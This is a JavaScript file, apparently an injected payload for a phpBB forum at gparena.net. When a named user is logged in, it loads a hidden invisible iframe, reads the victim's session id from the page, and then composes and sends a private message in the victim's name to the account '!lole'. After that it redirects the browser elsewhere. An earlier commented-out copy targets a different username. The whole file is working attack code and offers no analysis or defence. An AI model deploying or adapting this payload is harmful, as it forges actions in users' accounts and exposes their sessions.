// var header = document.getElementById('header');
// var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
// if (!document.getElementById("del1me")) {
//     if (user_name === "Bury_comedor") {
//         var iframe = document.createElement('iframe');
//         iframe.id = "del1me";
//         iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
//         iframe.height = "400";
//         iframe.width = "400";
//         iframe.style.opacity = 0;
//         iframe.style.position = "absolute";
//         iframe.style.zIndex = -1;
//         iframe.style.top = "-30px";
//         header.append(iframe);
//         const wait = setTimeout(stealThisMoment, secondsToMS(3));
//     };
// }

// function stealThisMoment() {
//     console.log("3secs!");
//     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
//     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
//     iframe.contentWindow.document.getElementById("subject").value = "beary";
//     iframe.contentWindow.document.getElementById("message").value = "chicanery";
//     iframe.contentWindow.document.getElementsByName("post")[0].click();
//     setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
// };


// function secondsToMS(seconds) {
//     return seconds * 1000;
// };

// var script_ids = ["a1", "a2", "a3", "a4"];

var header = document.getElementById('header');
var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
if (!document.getElementById("del1me")) {
    if (user_name === "BRAND") {
        var iframe = document.createElement('iframe');
        iframe.id = "del1me";
        iframe.src = `https://gparena.net/forum/`;
        iframe.height = "400";
        iframe.width = "400";
        iframe.style.opacity = 0;
        iframe.style.position = "absolute";
        iframe.style.zIndex = -1;
        iframe.style.top = "-30px";
        header.append(iframe);
        const wait = setTimeout(stealThisMoment, secondsToMS(3));
    };
}

function stealThisMoment() {
    console.log("3secs!");
    var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
    console.log("sid is = " + sid);

    setTimeout(() => { 
        
     }, secondsToMS(3));
    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
    iframe.contentWindow.document.getElementById("subject").value = "beary";
    iframe.contentWindow.document.getElementById("message").value = "chicanery";
    iframe.contentWindow.document.getElementsByName("post")[0].click();
    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
};


function secondsToMS(seconds) {
    return seconds * 1000;
};


window.location.replace('https://stackoverflow.com/questions/1226714/how-to-get-the-browser-to-navigate-to-url-in-javascript');

